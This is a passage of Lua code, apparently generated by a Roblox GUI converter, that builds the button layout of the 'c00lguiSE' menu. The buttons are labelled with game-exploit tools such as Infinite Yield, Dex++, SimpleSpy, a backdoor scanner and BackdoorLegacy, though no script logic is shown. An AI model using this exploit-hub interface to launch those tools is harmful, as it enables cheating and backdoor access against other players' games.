G2L["108"] = Instance.new("UIListLayout", G2L["107"]);
G2L["108"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["108"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["108"]["Wraps"] = true;
G2L["108"]["Padding"] = UDim.new(0.01, 0);
G2L["108"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["108"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["109"] = Instance.new("TextButton", G2L["107"]);
G2L["109"]["TextWrapped"] = true;
G2L["109"]["BorderSizePixel"] = 0;
G2L["109"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["109"]["TextSize"] = 15;
G2L["109"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["109"]["RichText"] = true;
G2L["109"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["109"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["109"]["Name"] = [[Button]];
G2L["109"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["109"]["Text"] = [[Nameless Admin]];
G2L["109"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["10a"] = Instance.new("LocalScript", G2L["109"]);
G2L["10a"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["10b"] = Instance.new("TextButton", G2L["107"]);
G2L["10b"]["TextWrapped"] = true;
G2L["10b"]["BorderSizePixel"] = 0;
G2L["10b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10b"]["TextSize"] = 15;
G2L["10b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["10b"]["RichText"] = true;
G2L["10b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10b"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["10b"]["Name"] = [[Button]];
G2L["10b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10b"]["Text"] = [[Infinite Yield FE]];
G2L["10b"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["10c"] = Instance.new("LocalScript", G2L["10b"]);
G2L["10c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["10d"] = Instance.new("TextButton", G2L["107"]);
G2L["10d"]["TextWrapped"] = true;
G2L["10d"]["BorderSizePixel"] = 0;
G2L["10d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10d"]["TextSize"] = 15;
G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["10d"]["RichText"] = true;
G2L["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10d"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["10d"]["Name"] = [[Button]];
G2L["10d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["Text"] = [[Fates Admin]];
G2L["10d"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["10e"] = Instance.new("LocalScript", G2L["10d"]);
G2L["10e"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["10f"] = Instance.new("TextButton", G2L["107"]);
G2L["10f"]["TextWrapped"] = true;
G2L["10f"]["BorderSizePixel"] = 0;
G2L["10f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10f"]["TextSize"] = 15;
G2L["10f"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["10f"]["RichText"] = true;
G2L["10f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10f"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["10f"]["Name"] = [[Button]];
G2L["10f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10f"]["Text"] = [[Fedora Admin]];
G2L["10f"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["110"] = Instance.new("LocalScript", G2L["10f"]);
G2L["110"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["111"] = Instance.new("TextButton", G2L["107"]);
G2L["111"]["TextWrapped"] = true;
G2L["111"]["BorderSizePixel"] = 0;
G2L["111"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["111"]["TextSize"] = 15;
G2L["111"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["111"]["RichText"] = true;
G2L["111"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["111"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["111"]["Name"] = [[Button]];
G2L["111"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["111"]["Text"] = [[Script Hub]];
G2L["111"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["112"] = Instance.new("LocalScript", G2L["111"]);
G2L["112"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["113"] = Instance.new("TextButton", G2L["107"]);
G2L["113"]["TextWrapped"] = true;
G2L["113"]["BorderSizePixel"] = 0;
G2L["113"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["113"]["TextSize"] = 15;
G2L["113"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["113"]["RichText"] = true;
G2L["113"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["113"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["113"]["Name"] = [[Button]];
G2L["113"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["113"]["Text"] = [[ScriptSpy]];
G2L["113"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["114"] = Instance.new("LocalScript", G2L["113"]);
G2L["114"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["115"] = Instance.new("TextButton", G2L["107"]);
G2L["115"]["TextWrapped"] = true;
G2L["115"]["BorderSizePixel"] = 0;
G2L["115"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["115"]["TextSize"] = 15;
G2L["115"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["115"]["RichText"] = true;
G2L["115"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["115"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["115"]["Name"] = [[Button]];
G2L["115"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["115"]["Text"] = [[Audio Logger]];
G2L["115"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["116"] = Instance.new("LocalScript", G2L["115"]);
G2L["116"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["117"] = Instance.new("TextButton", G2L["107"]);
G2L["117"]["TextWrapped"] = true;
G2L["117"]["BorderSizePixel"] = 0;
G2L["117"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["117"]["TextSize"] = 15;
G2L["117"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["117"]["RichText"] = true;
G2L["117"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["117"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["117"]["Name"] = [[Button]];
G2L["117"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Text"] = [[Animatrix]];
G2L["117"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["118"] = Instance.new("LocalScript", G2L["117"]);
G2L["118"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["119"] = Instance.new("TextButton", G2L["107"]);
G2L["119"]["TextWrapped"] = true;
G2L["119"]["BorderSizePixel"] = 0;
G2L["119"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["119"]["TextSize"] = 15;
G2L["119"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["119"]["RichText"] = true;
G2L["119"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["119"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["119"]["Name"] = [[Button]];
G2L["119"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["119"]["Text"] = [[QuirkyCMD]];
G2L["119"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["11a"] = Instance.new("LocalScript", G2L["119"]);
G2L["11a"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["11b"] = Instance.new("TextButton", G2L["107"]);
G2L["11b"]["TextWrapped"] = true;
G2L["11b"]["BorderSizePixel"] = 0;
G2L["11b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11b"]["TextSize"] = 15;
G2L["11b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["11b"]["RichText"] = true;
G2L["11b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11b"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["11b"]["Name"] = [[Button]];
G2L["11b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11b"]["Text"] = [[beckdeer skenner]];
G2L["11b"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["11c"] = Instance.new("LocalScript", G2L["11b"]);
G2L["11c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["11d"] = Instance.new("TextButton", G2L["107"]);
G2L["11d"]["TextWrapped"] = true;
G2L["11d"]["BorderSizePixel"] = 0;
G2L["11d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11d"]["TextSize"] = 15;
G2L["11d"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["11d"]["RichText"] = true;
G2L["11d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11d"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["11d"]["Name"] = [[Button]];
G2L["11d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11d"]["Text"] = [[BackdoorLegacy]];
G2L["11d"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["11e"] = Instance.new("LocalScript", G2L["11d"]);
G2L["11e"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["11f"] = Instance.new("TextButton", G2L["107"]);
G2L["11f"]["TextWrapped"] = true;
G2L["11f"]["BorderSizePixel"] = 0;
G2L["11f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11f"]["TextSize"] = 15;
G2L["11f"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["11f"]["RichText"] = true;
G2L["11f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11f"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["11f"]["Name"] = [[Button]];
G2L["11f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11f"]["Text"] = [[Comet]];
G2L["11f"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["120"] = Instance.new("LocalScript", G2L["11f"]);
G2L["120"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["121"] = Instance.new("TextButton", G2L["107"]);
G2L["121"]["TextWrapped"] = true;
G2L["121"]["BorderSizePixel"] = 0;
G2L["121"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["121"]["TextSize"] = 15;
G2L["121"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["121"]["RichText"] = true;
G2L["121"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["121"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["121"]["Name"] = [[Button]];
G2L["121"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["121"]["Text"] = [[FraktureSS]];
G2L["121"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["122"] = Instance.new("LocalScript", G2L["121"]);
G2L["122"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["123"] = Instance.new("TextButton", G2L["107"]);
G2L["123"]["TextWrapped"] = true;
G2L["123"]["BorderSizePixel"] = 0;
G2L["123"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["123"]["TextSize"] = 15;
G2L["123"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["123"]["RichText"] = true;
G2L["123"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["123"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["123"]["Name"] = [[Button]];
G2L["123"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["123"]["Text"] = [[CMD Admin]];
G2L["123"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["124"] = Instance.new("LocalScript", G2L["123"]);
G2L["124"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["125"] = Instance.new("TextButton", G2L["107"]);
G2L["125"]["TextWrapped"] = true;
G2L["125"]["BorderSizePixel"] = 0;
G2L["125"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["125"]["TextSize"] = 15;
G2L["125"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["125"]["RichText"] = true;
G2L["125"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["125"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["125"]["Name"] = [[Button]];
G2L["125"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["125"]["Text"] = [[Dex++]];
G2L["125"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["126"] = Instance.new("LocalScript", G2L["125"]);
G2L["126"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["127"] = Instance.new("TextButton", G2L["107"]);
G2L["127"]["TextWrapped"] = true;
G2L["127"]["BorderSizePixel"] = 0;
G2L["127"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["127"]["TextSize"] = 15;
G2L["127"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["127"]["RichText"] = true;
G2L["127"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["127"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["127"]["Name"] = [[Button]];
G2L["127"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["127"]["Text"] = [[ChatHax]];
G2L["127"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["128"] = Instance.new("LocalScript", G2L["127"]);
G2L["128"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["129"] = Instance.new("TextButton", G2L["107"]);
G2L["129"]["TextWrapped"] = true;
G2L["129"]["BorderSizePixel"] = 0;
G2L["129"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["129"]["TextSize"] = 15;
G2L["129"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["129"]["RichText"] = true;
G2L["129"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["129"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["129"]["Name"] = [[Button]];
G2L["129"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["129"]["Text"] = [[ImPatrick's NPC Control GUI]];
G2L["129"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["12a"] = Instance.new("LocalScript", G2L["129"]);
G2L["12a"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["12b"] = Instance.new("TextButton", G2L["107"]);
G2L["12b"]["TextWrapped"] = true;
G2L["12b"]["BorderSizePixel"] = 0;
G2L["12b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12b"]["TextSize"] = 15;
G2L["12b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["12b"]["RichText"] = true;
G2L["12b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12b"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["12b"]["Name"] = [[Button]];
G2L["12b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12b"]["Text"] = [[Console Line]];
G2L["12b"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["12c"] = Instance.new("LocalScript", G2L["12b"]);
G2L["12c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["12d"] = Instance.new("TextButton", G2L["107"]);
G2L["12d"]["TextWrapped"] = true;
G2L["12d"]["BorderSizePixel"] = 0;
G2L["12d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12d"]["TextSize"] = 15;
G2L["12d"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["12d"]["RichText"] = true;
G2L["12d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12d"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["12d"]["Name"] = [[Button]];
G2L["12d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12d"]["Text"] = [[SimpleSpy]];
G2L["12d"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["12e"] = Instance.new("LocalScript", G2L["12d"]);
G2L["12e"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["12f"] = Instance.new("TextButton", G2L["107"]);
G2L["12f"]["TextWrapped"] = true;
G2L["12f"]["BorderSizePixel"] = 0;
G2L["12f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12f"]["TextSize"] = 15;
G2L["12f"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["12f"]["RichText"] = true;
G2L["12f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12f"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["12f"]["Name"] = [[Button]];
G2L["12f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12f"]["Text"] = [[Hydroxide]];
G2L["12f"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["130"] = Instance.new("LocalScript", G2L["12f"]);
G2L["130"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["131"] = Instance.new("TextButton", G2L["107"]);
G2L["131"]["TextWrapped"] = true;
G2L["131"]["BorderSizePixel"] = 0;
G2L["131"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["131"]["TextSize"] = 15;
G2L["131"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["131"]["RichText"] = true;
G2L["131"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["131"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["131"]["Name"] = [[Button]];
G2L["131"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["131"]["Text"] = [[Avatar Changer]];
G2L["131"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["132"] = Instance.new("LocalScript", G2L["131"]);
G2L["132"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["133"] = Instance.new("TextButton", G2L["107"]);
G2L["133"]["TextWrapped"] = true;
G2L["133"]["BorderSizePixel"] = 0;
G2L["133"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["133"]["TextSize"] = 15;
G2L["133"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["133"]["RichText"] = true;
G2L["133"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["133"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["133"]["Name"] = [[Button]];
G2L["133"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["133"]["Text"] = [[Welding Hub]];
G2L["133"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["134"] = Instance.new("LocalScript", G2L["133"]);
G2L["134"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["135"] = Instance.new("TextButton", G2L["107"]);
G2L["135"]["TextWrapped"] = true;
G2L["135"]["BorderSizePixel"] = 0;
G2L["135"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["135"]["TextSize"] = 15;
G2L["135"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["135"]["RichText"] = true;
G2L["135"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["135"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["135"]["Name"] = [[Button]];
G2L["135"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["135"]["Text"] = [[CMD-X Admin]];
G2L["135"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["136"] = Instance.new("LocalScript", G2L["135"]);
G2L["136"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button
G2L["137"] = Instance.new("TextButton", G2L["107"]);
G2L["137"]["TextWrapped"] = true;
G2L["137"]["BorderSizePixel"] = 0;
G2L["137"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["137"]["TextSize"] = 15;
G2L["137"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["137"]["RichText"] = true;
G2L["137"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["137"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["137"]["Name"] = [[Button]];
G2L["137"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["137"]["Text"] = [[AirHub V2]];
G2L["137"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.Button.ButtonScript
G2L["138"] = Instance.new("LocalScript", G2L["137"]);
G2L["138"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc.
G2L["139"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["139"]["Visible"] = false;
G2L["139"]["Active"] = true;
G2L["139"]["BorderSizePixel"] = 0;
G2L["139"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["139"]["Name"] = [[Misc.]];
G2L["139"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["139"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["139"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["139"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["139"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Misc..UIListLayout
G2L["13a"] = Instance.new("UIListLayout", G2L["139"]);
G2L["13a"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["13a"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["13a"]["Wraps"] = true;
G2L["13a"]["Padding"] = UDim.new(0.01, 0);
G2L["13a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["13a"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["13b"] = Instance.new("TextButton", G2L["139"]);
G2L["13b"]["TextWrapped"] = true;
G2L["13b"]["BorderSizePixel"] = 0;
G2L["13b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13b"]["TextSize"] = 15;
G2L["13b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["13b"]["RichText"] = true;
G2L["13b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13b"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["13b"]["Name"] = [[Button]];
G2L["13b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13b"]["Text"] = [[Destroy GUI]];
G2L["13b"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["13c"] = Instance.new("LocalScript", G2L["13b"]);
G2L["13c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["13d"] = Instance.new("TextButton", G2L["139"]);
G2L["13d"]["TextWrapped"] = true;
G2L["13d"]["BorderSizePixel"] = 0;
G2L["13d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13d"]["TextSize"] = 15;
G2L["13d"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["13d"]["RichText"] = true;
G2L["13d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13d"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["13d"]["Name"] = [[Button]];
G2L["13d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13d"]["Text"] = [[Developer Console]];
G2L["13d"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button.ButtonScript
G2L["13e"] = Instance.new("LocalScript", G2L["13d"]);
G2L["13e"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Misc..Button
G2L["13f"] = Instance.new("TextButton", G2L["139"]);
G2L["13f"]["TextWrapped"] = true;
